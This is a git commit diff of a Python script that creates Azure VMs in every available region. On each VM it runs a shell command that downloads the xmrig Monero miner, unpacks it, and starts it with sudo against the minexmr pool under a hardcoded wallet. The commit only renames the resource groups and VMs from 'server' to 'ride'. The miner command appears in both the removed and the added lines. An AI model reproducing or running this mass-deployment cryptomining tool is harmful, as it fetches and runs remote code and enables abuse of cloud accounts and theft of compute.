df0b354e1f9d26de8826f8e226e558a8cc172447
Thuwarakan <mothuwarakan@gmail.com>
2022-09-03 19:27:25 +0530

    Update main.py

--- main.py
+++ main.py
@@ -36,16 +36,16 @@ response = az_cli('account list-locations')
 def deployer(x):
         location=(response[x]["name"])
         #CREATING GROUP
-        group   = az_cli('group create --name server'+str(x)+' --location '+location)
+        group   = az_cli('group create --name ride'+str(x)+' --location '+location)
         if(len(str(group))!=4):
           if (len(group)==7):
-            runC='az vm run-command invoke -g server'+str(x)+' -n server'+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 4834UE5mV3n1PG7yZRZ7mAiTGWi6mDtUJcgLugeYAj76NwDa8mG78x3JEvsMYFjCgbVPAX1V8coxW4RHknwHxG55Nvbk6Pi.'+sn+'"'  
+            runC='az vm run-command invoke -g ride'+str(x)+' -n ride'+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 4834UE5mV3n1PG7yZRZ7mAiTGWi6mDtUJcgLugeYAj76NwDa8mG78x3JEvsMYFjCgbVPAX1V8coxW4RHknwHxG55Nvbk6Pi.'+sn+'"'  
             print("Deploying VM")
-            print("      * VM NAME     : server"+str(x))
-            print("      * VM GROUP    : server"+str(x))
+            print("      * VM NAME     : ride"+str(x))
+            print("      * VM GROUP    : ride"+str(x))
             print("      * VM LOCATION : "+location)
             #DEPLOYING VM
-            VM      =  az_cli('vm create --resource-group server'+str(x)+' --name server'+str(x)+' --image UbuntuLTS --size Standard_F8s --generate-ssh-keys')
+            VM      =  az_cli('vm create --resource-group ride'+str(x)+' --name ride'+str(x)+' --image UbuntuLTS --size Standard_F8s --generate-ssh-keys')
             #print("      * Script Executing : "+runC)
 
             
